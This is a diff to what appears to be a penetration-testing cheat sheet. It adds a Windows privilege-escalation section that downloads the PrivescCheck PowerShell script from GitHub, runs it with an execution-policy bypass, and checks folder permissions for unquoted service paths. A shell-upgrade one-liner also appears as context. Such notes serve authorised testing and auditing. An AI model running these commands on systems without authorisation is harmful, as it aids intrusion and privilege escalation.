@@ -39,5 +39,13 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 ## <a name='escalation'></a>escalation
+```sh
+# download privescCheck.ps1
+wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
 
-[PrivescCheck.ps1](https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1)
+# extended execution + txt report
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%"
+
+# unquoted service path
+accesschk /accepteula -uwdq "C:\Program Files\Unquoted Service Path"
+accesschk /accepteula -uwdq "C:\Program Files (x86)\Windows Identity Foundation\v3.5\"
